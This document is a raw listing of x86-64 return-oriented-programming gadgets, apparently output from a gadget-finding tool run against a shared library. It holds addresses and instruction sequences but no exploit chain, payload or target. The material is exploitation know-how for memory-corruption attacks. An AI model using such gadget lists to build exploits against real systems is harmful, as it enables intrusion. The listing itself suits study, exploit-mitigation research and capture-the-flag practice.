0x00002aaaaaaffecd : ror byte ptr [rdi], 0x84 ; ret 5
0x00002aaaaabe4ff2 : ror byte ptr [rdi], 0x84 ; sbb eax, 0x89000001 ; ret 0x8944
0x00002aaaaab4b38c : ror byte ptr [rdi], 0x84 ; xchg eax, ebp ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac39c0a : ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x00002aaaaab58f05 : ror byte ptr [rdi], 0x85 ; in al, dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab734dc : ror byte ptr [rdi], 0x85 ; jge 0x9e4ea ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab5aa91 : ror byte ptr [rdi], 0x85 ; lock add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab62f28 : ror byte ptr [rdi], 0x85 ; mov cl, 0 ; add byte ptr [rax], al ; xor rax, rax ; ret
0x00002aaaaab79111 : ror byte ptr [rdi], 0x85 ; pop rax ; or dword ptr [rax], eax ; add cl, ch ; ret
0x00002aaaaab31d99 : ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaab75a57 : ror byte ptr [rdi], 0x85 ; ret 0x13
0x00002aaaaab350bb : ror byte ptr [rdi], 0x85 ; ret 0x31
0x00002aaaaabafcdf : ror byte ptr [rdi], 0x85 ; ret 0xfff8
0x00002aaaaabe7d25 : ror byte ptr [rdi], 0x85 ; ret 0xfffa
0x00002aaaaabedcae : ror byte ptr [rdi], 0x85 ; ret 0xfffe
0x00002aaaaabf66a8 : ror byte ptr [rdi], 0x88 ; ret
0x00002aaaaabccb17 : ror byte ptr [rdi], 0x88 ; ret 1
0x00002aaaaabd47f4 : ror byte ptr [rdi], 0x89 ; ret 0xfffe
0x00002aaaaab90223 : ror byte ptr [rdi], 0x89 ; ret 3
0x00002aaaaaba1cef : ror byte ptr [rdi], 0x92 ; ret 0xd029
0x00002aaaaab5c94d : ror byte ptr [rdi], 0x94 ; ret
0x00002aaaaabc19be : ror byte ptr [rdi], 0x94 ; ret 0x1589
0x00002aaaaabb71e7 : ror byte ptr [rdi], 0x94 ; ret 0x2fe9
0x00002aaaaab9014b : ror byte ptr [rdi], 0x94 ; ret 0x3840
0x00002aaaaac0b126 : ror byte ptr [rdi], 0x94 ; ret 0x3d83
0x00002aaaaab90218 : ror byte ptr [rdi], 0x94 ; ret 0x5438
0x00002aaaaab2e901 : ror byte ptr [rdi], 0x94 ; ret 0x7f3c
0x00002aaaaab55ebc : ror byte ptr [rdi], 0x94 ; ret 0x82e9
0x00002aaaaabb4f48 : ror byte ptr [rdi], 0x94 ; ret 0x8445
0x00002aaaaaaf5775 : ror byte ptr [rdi], 0x94 ; ret 0x8d48
0x00002aaaaab36a94 : ror byte ptr [rdi], 0x94 ; ret 0xd309
0x00002aaaaab44fba : ror byte ptr [rdi], 0x94 ; ret 0xdaf7
0x00002aaaaabccd6d : ror byte ptr [rdi], 0x94 ; ror byte ptr [rax - 0x7d], 0xc4 ; movzx rax, al ; ret
0x00002aaaaab1a3b1 : ror byte ptr [rdi], 0x94 ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaabe3fe3 : ror byte ptr [rdi], 0x95 ; ret
0x00002aaaaabadf35 : ror byte ptr [rdi], 0x95 ; ret 0x8341
0x00002aaaaab8eb7f : ror byte ptr [rdi], 0x95 ; ret 0xa8e9
0x00002aaaaab8ea2a : ror byte ptr [rdi], 0x95 ; ret 0xd721
0x00002aaaaab1ac3d : ror byte ptr [rdi], 0x95 ; ret 0xdaf7
0x00002aaaaab816ff : ror byte ptr [rdi], 0x95 ; ret 0xe883
0x00002aaaaab819ec : ror byte ptr [rdi], 0x95 ; ret 0xf983
0x00002aaaaabae00b : ror byte ptr [rdi], 0x95 ; ret 0xfb83
0x00002aaaaac0476a : ror byte ptr [rdi], 0x95 ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaab40348 : ror byte ptr [rdi], 0x95 ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; ret
0x00002aaaaab4871c : ror byte ptr [rdi], 0x9f ; ret 0x3841
0x00002aaaaab8fa45 : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x14 ; add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaaba2005 : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; add bh, bh ; ret
0x00002aaaaac0262b : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac0fc5a : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab0a22b : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rcx - 0x3fcebfbd], 0x5b ; ret
0x00002aaaaabbedfd : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rdi], 0x47 ; ret 0x90c3
0x00002aaaaabe300f : ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4034b : ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; ret
0x00002aaaaab805cc : ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; ret
0x00002aaaaabccf5a : ror byte ptr [rdi], 0xb6 ; shr byte ptr [rcx], cl ; sal bl, 1 ; ret
0x00002aaaaab08bce : ror byte ptr [rdi], 1 ; mov dh, 0x17 ; test dl, dl ; jne 0x33bb8 ; ret
0x00002aaaaabba245 : ror byte ptr [rdi], 1 ; ret 0x3941
0x00002aaaaabb051f : ror byte ptr [rdi], 1 ; ret 0xf039
0x00002aaaaab54239 : ror byte ptr [rdi], 1 ; test byte ptr [rax], bh ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab95d4b : ror byte ptr [rdi], 1 ; test dh, ch ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab6b76d : ror byte ptr [rdi], 1 ; xchg eax, esp ; ret
0x00002aaaaab735fd : ror byte ptr [rdi], cl ; mov ebp, 0xf80148c0 ; ret
0x00002aaaaab4a50c : ror byte ptr [rdi], cl ; test byte ptr [rbp - 0x77000000], dh ; ret 0xd089
0x00002aaaaab5fdab : ror byte ptr [rdi], cl ; test byte ptr [rsi + 0x48000000], bl ; bsf eax, edx ; ret
0x00002aaaaab5fbeb : ror byte ptr [rdi], cl ; test byte ptr [rsi], bh ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00002aaaaab9049a : ror byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x3840
0x00002aaaaab6cdb7 : ror byte ptr [rdi], cl ; xchg eax, ebp ; ret 0xb60f
0x00002aaaaac0b16b : ror byte ptr [rdi], cl ; xchg eax, ebp ; sal bh, 0xd8 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab8bcd0 : ror byte ptr [rdi], cl ; xchg eax, ebx ; ret 0xd108
0x00002aaaaab811ba : ror byte ptr [rdi], cl ; xchg eax, esp ; rol bl, 0x90 ; mov eax, 1 ; ret
0x00002aaaaac6aa38 : ror byte ptr [rsi - 0x6faf0004], 1 ; cld ; call rax
0x00002aaaaac6a9f4 : ror byte ptr [rsp + rdi*8 - 0x371af01], 1 ; call rax
0x00002aaaaac5d564 : ror byte ptr [rsp + rsi*8 - 1], 0xc0 ; hlt ; jmp rax
0x00002aaaaac5d568 : ror byte ptr [rsp + rsi*8 - 1], 0xe0 ; hlt ; jmp qword ptr [rax + 0x22fff44c]
0x00002aaaaac697b8 : ror ch, 1 ; sti ; jmp qword ptr [rax]
0x00002aaaaac69770 : ror dl, 0xfb ; call qword ptr [rax]
0x00002aaaaab6df7f : ror dword ptr [r9 + 0x1ef8c1f8], -0x77 ; ret 0x8b48
0x00002aaaaab49143 : ror dword ptr [rax + 0x29], cl ; ret
0x00002aaaaab9762c : ror dword ptr [rax + 0x63], 1 ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaaba1801 : ror dword ptr [rax + 0x63], cl ; ret
0x00002aaaaabde630 : ror dword ptr [rax + 0xf], 1 ; scasd eax, dword ptr [rdi] ; ror dword ptr [rax - 0x3f], -0x16 ; adc byte ptr [rax + 1], cl ; ret 0x3948
0x00002aaaaac1eb95 : ror dword ptr [rax + 1], -8 ; ret
0x00002aaaaac1ea59 : ror dword ptr [rax + 1], -8 ; sub rax, r8 ; ret
0x00002aaaaac1ecae : ror dword ptr [rax + 1], -8 ; sub rax, rdx ; ret
0x00002aaaaac13717 : ror dword ptr [rax + 1], cl ; ret
0x00002aaaaabde634 : ror dword ptr [rax - 0x3f], -0x16 ; adc byte ptr [rax + 1], cl ; ret 0x3948
0x00002aaaaab0f686 : ror dword ptr [rax - 0x3f], -0x1e ; and byte ptr [rax - 0x77], cl ; enter 0x948, -0x30 ; ret
0x00002aaaaab73236 : ror dword ptr [rax - 0x73], 0x51 ; add esi, eax ; add dword ptr [rax], eax ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaabb2c7e : ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x00002aaaaabaefcc : ror dword ptr [rax - 0x75], cl ; cmp cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaab1eda3 : ror dword ptr [rax - 0x77], 0x34 ; ret 0x8348
0x00002aaaaab73185 : ror dword ptr [rax - 0x77], 0xa ; ret
0x00002aaaaabda23d : ror dword ptr [rax - 0x77], 1 ; fadd st(6) ; add al, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaabb1017 : ror dword ptr [rax - 0x77], 1 ; ret 0x94d
0x00002aaaaac17191 : ror dword ptr [rax - 0x77], 1 ; ret 0xc148
0x00002aaaaab27bd0 : ror dword ptr [rax - 0x77], 1 ; ret 0xf7e9
0x00002aaaaac22082 : ror dword ptr [rax - 0x77], 1 ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaab46bfd : ror dword ptr [rax - 0x7b], -0x2e ; jne 0x71bf7 ; ret
0x00002aaaaab4ff3d : ror dword ptr [rax - 0x7b], -0x2e ; jne 0x7af37 ; ret
0x00002aaaaabf2594 : ror dword ptr [rax - 0x7d], -0x26 ; add ecx, dword ptr [rax + 0x29] ; fimul dword ptr [rax - 0x7d] ; ret 0xe801
0x00002aaaaab0f178 : ror dword ptr [rax - 0x7d], 1 ; ret 0x4801
0x00002aaaaab07752 : ror dword ptr [rax - 0x7d], cl ; ret
0x00002aaaaab2064f : ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x00002aaaaab95a15 : ror dword ptr [rax - 0x7d], cl ; ret 0xf601
0x00002aaaaabb9b3f : ror dword ptr [rax], -0x17 ; ret 0xfffe
0x00002aaaaac04190 : ror dword ptr [rbp + 0x39], 1 ; ret 0x850f
0x00002aaaaab8b3b7 : ror dword ptr [rbx + rcx*4 - 0x44], cl ; and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaab6f4d0 : ror dword ptr [rbx - 0x73], 0x14 ; cmovs ebp, dword ptr [rcx] ; ret
0x00002aaaaab6df80 : ror dword ptr [rcx + 0x1ef8c1f8], -0x77 ; ret 0x8b48
0x00002aaaaabb1014 : ror dword ptr [rcx + 0x21], 1 ; ror dword ptr [rax - 0x77], 1 ; ret 0x94d
0x00002aaaaab012c2 : ror dword ptr [rcx + 1], 1 ; ret 0x854d
0x00002aaaaab68ee5 : ror dword ptr [rcx + rcx*4 + 0xf], 1 ; pop rbx ; ret
0x00002aaaaabbba34 : ror dword ptr [rcx + rcx*4], cl ; push rsp ; ret
0x00002aaaaab68edf : ror dword ptr [rcx - 0x2d], -0x1f ; or r9, r10 ; mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaabbd6ab : ror dword ptr [rcx - 0x75], 0x2c ; ret 0x8948
0x00002aaaaabbd6b3 : ror dword ptr [rcx - 0x77], 0x1c ; ret 0x8348
0x00002aaaaac44d17 : ror dword ptr [rcx], cl ; ret 0xe074
0x00002aaaaab6eb43 : ror dword ptr [rdi - 0x73], 0x44 ; movups xmm1, xmmword ptr [rdi] ; xchg eax, ebx ; ret
0x00002aaaaab73475 : ror dword ptr [rdi], -0x43 ; ror byte ptr [rax + 1], 0xf8 ; ret
0x00002aaaaabddb03 : ror dword ptr [rdi], -0x49 ; ror byte ptr [rax - 0x3f], 0xe9 ; adc byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; ret 0xf48
0x00002aaaaab113d8 : ror dword ptr [rdi], -0x6b ; ret 0xd348
0x00002aaaaabb83dd : ror dword ptr [rdi], -0x6c ; ret 0x3ae9
0x00002aaaaabaca17 : ror dword ptr [rdi], -0x6e ; ret 0xd138
0x00002aaaaac43438 : ror dword ptr [rdi], -0x7b ; adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43b44 : ror dword ptr [rdi], -0x7b ; add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43916 : ror dword ptr [rdi], -0x7b ; add eax, 0xc0310000 ; ret
0x00002aaaaac44a40 : ror dword ptr [rdi], -0x7b ; cmp al, 2 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43896 : ror dword ptr [rdi], -0x7b ; cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x00002aaaaac43bd4 : ror dword ptr [rdi], -0x7b ; je 0x16ebe4 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac436cb : ror dword ptr [rdi], -0x7b ; jno 0x16e6e0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43793 : ror dword ptr [rdi], -0x7b ; mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaabef0e7 : ror dword ptr [rdi], -0x7b ; ret 0xfffe
0x00002aaaaac43410 : ror dword ptr [rdi], -0x7b ; sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaabb5129 : ror dword ptr [rdi], 1 ; cmp dword ptr [rip + 0x66000002], 0xf ; outsd dx, dword ptr [rsi] ; ret 0xddeb
0x00002aaaaab53dbf : ror dword ptr [rdi], 1 ; xchg dword ptr [rdx], edx ; add eax, dword ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x00002aaaaabccf3c : ror dword ptr [rdi], 1 ; xchg eax, edx ; ret 0x970f
0x00002aaaaab73267 : ror dword ptr [rdi], 1 ; xchg eax, esp ; ret
0x00002aaaaabf8045 : ror dword ptr [rdi], cl ; xchg eax, esi ; ret 0xfb83
0x00002aaaaabed7b3 : ror eax, 8 ; ret
0x00002aaaaac5d4ec : ror edx, 1 ; jmp qword ptr [rdi]
0x00002aaaaab46bfc : ror qword ptr [r8 - 0x7b], -0x2e ; jne 0x71bf8 ; ret
0x00002aaaaab4ff3c : ror qword ptr [r8 - 0x7b], -0x2e ; jne 0x7af38 ; ret
0x00002aaaaab5cca3 : sahf ; adc byte ptr [rax], al ; mov rdx, rcx ; jmp 0x87c76
0x00002aaaaab205ff : sahf ; adc eax, dword ptr [rax] ; movsxd rax, dword ptr [rax + rdx*4] ; add rax, rdi ; jmp rax
0x00002aaaaac6b71d : sahf ; add byte ptr [rax], al ; add al, 0xa6 ; jmp 0x196729
0x00002aaaaab46385 : sahf ; add byte ptr [rax], al ; mov edx, eax ; jmp 0x71325
0x00002aaaaac6a849 : sahf ; cld ; call qword ptr [rdx + 0x22fffc9d]
0x00002aaaaac6a845 : sahf ; cld ; jmp qword ptr [rdx]
0x00002aaaaac6a9c5 : sahf ; cld ; jmp rax
0x00002aaaaac6a809 : sahf ; cld ; lcall ptr [rbp + rbx*4 - 0x62d30004] ; cld ; call rdx
0x00002aaaaac6a550 : sahf ; cmpsd dword ptr [rsi], dword ptr [rdi] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6ba29 : sahf ; in eax, dx ; inc dword ptr [rbp + rsi*4 - 0x5f4c0000] ; in eax, dx ; jmp rsp
0x00002aaaaaad75e2 : sahf ; jl 0x2577 ; loop 0x25c2 ; ret 0x23cb
0x00002aaaaaad75e1 : sahf ; jl 0x2578 ; loop 0x25c3 ; ret 0x23cb
0x00002aaaaabf379e : sahf ; mov edx, 0x448b0006 ; ret 0x4804
0x00002aaaaaad7d10 : sahf ; movabs r11, -0xc0717dedb2c1700 ; ret
0x00002aaaaabb4190 : sahf ; or al, byte ptr [rax] ; movsxd rax, dword ptr [rax + rdx*4] ; add rax, rdi ; jmp rax
0x00002aaaaac1f9de : sahf ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaabbd5d3 : sahf ; ret
0x00002aaaaab1e3f1 : sahf ; ret 0x148
0x00002aaaaab96803 : sahf ; ret 0x1fbd
0x00002aaaaac579c5 : sahf ; ret 0x38ae
0x00002aaaaab0d87c : sahf ; ret 0x8348
0x00002aaaaabbd5dc : sahf ; ret 0x844
0x00002aaaaab903df : sahf ; ret 0xe8c1
0x00002aaaaaad745b : sahf ; sbb byte ptr [rax], cl ; ret 0x5576
0x00002aaaaab20aae : sahf ; xor al, 2 ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab93b3d : sal bh, 0xd0 ; add eax, 0x16e ; ret
0x00002aaaaabab651 : sal bh, 0xd0 ; and eax, 2 ; ret
0x00002aaaaac0b16e : sal bh, 0xd8 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0b7b9 : sal bh, 0xd8 ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe3012 : sal bh, 0xd8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4034e : sal bh, 0xd8 ; pop rbx ; ret
0x00002aaaaab4031b : sal bh, 0xd8 ; ret
0x00002aaaaab7f142 : sal bh, 0xf1 ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab5f517 : sal bh, 1 ; ret 0x8000
0x00002aaaaab5f3d7 : sal bh, 1 ; ret 0xc000
0x00002aaaaab5f297 : sal bh, 1 ; ret 0xe000
0x00002aaaaab5f157 : sal bh, 1 ; ret 0xf000
0x00002aaaaab5f017 : sal bh, 1 ; ret 0xf800
0x00002aaaaab5eed7 : sal bh, 1 ; ret 0xfc00
0x00002aaaaab5ed97 : sal bh, 1 ; ret 0xfe00
0x00002aaaaab5ec57 : sal bh, 1 ; ret 0xff00
0x00002aaaaab5eb17 : sal bh, 1 ; ret 0xff80
0x00002aaaaab5e9d7 : sal bh, 1 ; ret 0xffc0
0x00002aaaaab5e897 : sal bh, 1 ; ret 0xffe0
0x00002aaaaab5e757 : sal bh, 1 ; ret 0xfff0
0x00002aaaaab5e617 : sal bh, 1 ; ret 0xfff8
0x00002aaaaab5e4d7 : sal bh, 1 ; ret 0xfffc
0x00002aaaaab5e397 : sal bh, 1 ; ret 0xfffe
0x00002aaaaab254c4 : sal bh, cl ; int1 ; add eax, r8d ; ret
0x00002aaaaabf8237 : sal bl, 0x48 ; stosd dword ptr [rdi], eax ; mov eax, r8d ; ret
0x00002aaaaac5d29d : sal bl, 1 ; call qword ptr [rcx]
0x00002aaaaab1aa28 : sal bl, 1 ; ret
0x00002aaaaab5db13 : sal byte ptr [rax + rbp + 0x48], 0x89 ; ret 0x8948
0x00002aaaaab80b6f : sal byte ptr [rax + rbx + 0x49], 0x83 ; ret 0x4908
0x00002aaaaaba36b1 : sal byte ptr [rax + rcx + 0xf], 0xb6 ; add cl, byte ptr [rax - 0x7d] ; ret 0x8301
0x00002aaaaac0adf5 : sal byte ptr [rax + rcx*2 - 0x75], 0x50 ; adc dh, dh ; ret 0x7401
0x00002aaaaac69a44 : sal byte ptr [rax], 1 ; cld ; call rax
0x00002aaaaac01aa5 : sal byte ptr [rbp + 0x10], 0x48 ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac049dc : sal byte ptr [rbp + 0x11], 0x48 ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0116b : sal byte ptr [rbp + 0x12], 0x48 ; add esp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac485f7 : sal byte ptr [rbp + 0x1e], 0x49 ; mov edi, dword ptr [rbp] ; call 0x1f8b1
0x00002aaaaac0fc75 : sal byte ptr [rbp + 0x50], 0x48 ; add esp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab62f68 : sal byte ptr [rbp + 0x55], 0x48 ; xor eax, eax ; ret
0x00002aaaaabffdf2 : sal byte ptr [rbp + 0xb], 0x31 ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac01002 : sal byte ptr [rbp + 0xb], 0x48 ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab28995 : sal byte ptr [rbp + 0xc], 0x31 ; div dh ; ret 0x4050
0x00002aaaaab9ba81 : sal byte ptr [rbp + 0xc], 0x5b ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac10891 : sal byte ptr [rbp + 0xc], cl ; mov eax, 1 ; ret
0x00002aaaaab61c80 : sal byte ptr [rbp + 0xd], 0x48 ; add esp, 8 ; ret
0x00002aaaaab3fcc0 : sal byte ptr [rbp + 0xd], 0x48 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac04827 : sal byte ptr [rbp + 0xe], 0x48 ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab2655e : sal byte ptr [rbp + 5], 0xf6 ; ret 0x7450
0x00002aaaaabe8ec7 : sal byte ptr [rbp + 6], 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab0a307 : sal byte ptr [rbp + 6], 0xf3 ; ret
0x00002aaaaabe8e54 : sal byte ptr [rbp + 9], 0x48 ; cmp dword ptr [rdi], 0 ; je 0x113e72 ; ret
0x00002aaaaac025b4 : sal byte ptr [rbp + 9], 0x5b ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaabe95a4 : sal byte ptr [rbp + 9], 0xf3 ; ret
0x00002aaaaab4f394 : sal byte ptr [rbp + 9], cl ; ret
0x00002aaaaac00633 : sal byte ptr [rbp + rax + 0x48], 0x89 ; out dx, eax ; call rax
0x00002aaaaac02251 : sal byte ptr [rbp + rax + 0x48], cl ; mov edi, ebp ; call rdx
0x00002aaaaac08514 : sal byte ptr [rbp + rax + 0x4c], 0x89 ; out dx, eax ; call rax
0x00002aaaaac0c6c9 : sal byte ptr [rbp + rax*4 + 0x64], 0x48 ; mov dword ptr [rbx], eax ; pop rbx ; ret
0x00002aaaaabe7730 : sal byte ptr [rbp + rbx + 0x48], 0x8b ; jp 0x112791 ; mov rsi, rdx ; call rax
0x00002aaaaac1eb90 : sal byte ptr [rbp + rbx*8 + 0x48], cl ; movsxd rax, ecx ; add rax, rdi ; ret
0x00002aaaaac0cb00 : sal byte ptr [rbp + rcx + 0x5b], 0x5d ; pop r12 ; ret
0x00002aaaaab80368 : sal byte ptr [rbp + rdx - 0x78], cl ; rol dword ptr [rax + 0x1e740fe1], 1 ; ret
0x00002aaaaabe94b1 : sal byte ptr [rbp - 0x10], 0x5a ; pop r10 ; ret
0x00002aaaaab51845 : sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x00002aaaaab72f35 : sal byte ptr [rbp - 0x10], cl ; ret
0x00002aaaaac7ba20 : sal byte ptr [rbp - 0x11], 1 ; jmp qword ptr [rax]
0x00002aaaaab1d086 : sal byte ptr [rbp - 0x11], 1 ; xor eax, eax ; ret
0x00002aaaaabe97ee : sal byte ptr [rbp - 0x11], cl ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaab5da20 : sal byte ptr [rbp - 0x13], 0xf3 ; ret
0x00002aaaaab7e7d0 : sal byte ptr [rbp - 0x13], cl ; lea rax, qword ptr [rcx - 1] ; ret
0x00002aaaaab46c00 : sal byte ptr [rbp - 0x13], cl ; ret
0x00002aaaaab7322a : sal byte ptr [rbp - 0x15], cl ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac0d336 : sal byte ptr [rbp - 0x19], 0x5b ; ret
0x00002aaaaaba5cbd : sal byte ptr [rbp - 0x19], cl ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab73c5b : sal byte ptr [rbp - 0x1e], 0x31 ; shr byte ptr [rcx], 0xc8 ; ret
0x00002aaaaaba5a1f : sal byte ptr [rbp - 0x21], cl ; ret
0x00002aaaaaba5af1 : sal byte ptr [rbp - 0x23], 0x31 ; rol byte ptr [rbx - 0x6bf0fe06], 0xc0 ; ret
0x00002aaaaab732a8 : sal byte ptr [rbp - 0x23], cl ; pop rbx ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaaba1670 : sal byte ptr [rbp - 0x24], cl ; mov dword ptr fs:[0x2d0], eax ; ret
0x00002aaaaab72fd3 : sal byte ptr [rbp - 0x26], 0xf3 ; ret
0x00002aaaaab08bd3 : sal byte ptr [rbp - 0x27], cl ; ret
0x00002aaaaabf79cb : sal byte ptr [rbp - 0x2e], 1 ; mov qword ptr [rsi], rcx ; xor eax, eax ; ret
0x00002aaaaab80a72 : sal byte ptr [rbp - 0x35], 0xf3 ; ret
0x00002aaaaabae6ed : sal byte ptr [rbp - 0x38], cl ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabaafe6 : sal byte ptr [rbp - 0x3d], 1 ; mov dword ptr [rdi + 0x2c], r8d ; mov dword ptr [rdi + 0x30], r8d ; ret
0x00002aaaaab61c5d : sal byte ptr [rbp - 0x42], 0x48 ; add esp, 8 ; ret
0x00002aaaaab5cb8e : sal byte ptr [rbp - 0x51], 1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabcfaee : sal byte ptr [rbp - 0x61], 0x89 ; out dx, eax ; call 0xf6d07
0x00002aaaaabe9946 : sal byte ptr [rbp - 0x69], 0x48 ; mov ebx, dword ptr [rbp - 8] ; leave ; ret
0x00002aaaaab5daca : sal byte ptr [rbp - 0xd], cl ; ret
0x00002aaaaab81f1b : sal byte ptr [rbp - 0xe], cl ; ret
0x00002aaaaabff452 : sal byte ptr [rbx + 0x31], 0xc0 ; pop rbx ; ret
0x00002aaaaac0109c : sal byte ptr [rbx + 0x48], 0x8b ; sbb ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaabd3662 : sal byte ptr [rbx + rax + 0x48], 0x89 ; adc bl, dh ; ret
0x00002aaaaabd3383 : sal byte ptr [rbx + rbx + 0x48], 0x39 ; ret
0x00002aaaaac01c42 : sal byte ptr [rbx + rcx + 0x31], 0xc0 ; ret
0x00002aaaaabe8144 : sal byte ptr [rbx + rcx + 0x39], cl ; ret 0xf7e
0x00002aaaaabd3e65 : sal byte ptr [rbx + rcx + 0x48], 0x83 ; ret 0x4808
0x00002aaaaac0c6f2 : sal byte ptr [rbx + rcx + 0x48], 1 ; add esp, 8 ; ret
0x00002aaaaac0c722 : sal byte ptr [rbx + rcx + 0x48], 1 ; sub eax, -0x80 ; add rsp, 8 ; ret
0x00002aaaaab42cdf : sal byte ptr [rbx + rdi*2 + 0x48], 0x89 ; ret
0x00002aaaaac0228e : sal byte ptr [rbx + rdx + 0xf], cl ; mov dh, 0x40 ; or dh, dh ; ret 0x8802
0x00002aaaaab4461a : sal byte ptr [rbx + rdx*2 + 0x48], 0x89 ; ret
0x00002aaaaab7325e : sal byte ptr [rcx + 0x44], 0x38 ; ret 0x4153
0x00002aaaaabf42be : sal byte ptr [rcx + rcx + 0x48], 0x8d ; cmp eax, 0x2a83d8 ; call rax
0x00002aaaaac066a1 : sal byte ptr [rcx + rcx + 0x48], 0x8d ; mov ebx, 0xc8 ; call rax
0x00002aaaaabda1e9 : sal byte ptr [rcx + rdi*2 + 0x48], 0x39 ; ret
0x00002aaaaab5fc4c : sal byte ptr [rcx + rdx + 0x48], cl ; bsf eax, edx ; ret
0x00002aaaaac49ca8 : sal byte ptr [rcx - 0x15], 1 ; call rax
0x00002aaaaac49c94 : sal byte ptr [rcx - 0x15], 1 ; jmp rax
0x00002aaaaaaf68de : sal byte ptr [rcx], 0xc9 ; not eax ; xor edx, edx ; add eax, 2 ; push rax ; call rbx
0x00002aaaaab814c3 : sal byte ptr [rcx], 0xc9 ; xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab4d1cb : sal byte ptr [rcx], 0xd2 ; div rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe8eb6 : sal byte ptr [rcx], 1 ; ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x00002aaaaabcf0d5 : sal byte ptr [rcx], cl ; div byte ptr [rcx] ; shr al, 0x71 ; ret
0x00002aaaaabcaef1 : sal byte ptr [rcx], cl ; test byte ptr [rax - 0x73], 0x7c ; and al, 0xc ; call rax
0x00002aaaaabd79f2 : sal byte ptr [rcx], cl ; test byte ptr [rax - 0x77], 0xc3 ; call rax
